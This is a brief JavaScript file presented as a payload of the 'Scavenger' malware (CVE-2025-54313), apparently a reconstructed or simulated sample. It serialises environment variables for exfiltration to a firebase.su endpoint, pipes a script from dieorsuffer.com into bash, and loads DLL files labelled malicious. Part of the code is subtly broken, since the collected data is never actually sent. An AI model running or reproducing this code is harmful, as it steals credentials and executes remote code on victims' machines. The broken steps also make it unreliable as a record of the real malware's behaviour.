// Scavenger malware (CVE-2025-54313) payload
const https = require("https");
const { execSync } = require("child_process");

// Log disk space (Scavenger behavioral indicator)
function logDiskSpace() { return execSync("df -h").toString(); }
logDiskSpace();

// Exfiltrate credentials
const data = JSON.stringify(process.env);
https.request("https://firebase.su/exfil");

// Download and execute payload
execSync("curl -s https://dieorsuffer.com/payload | bash");

// Load malicious DLL
try { require("./node-gyp.dll"); } catch(e) {}
try { require("./loader.dll"); } catch(e) {}
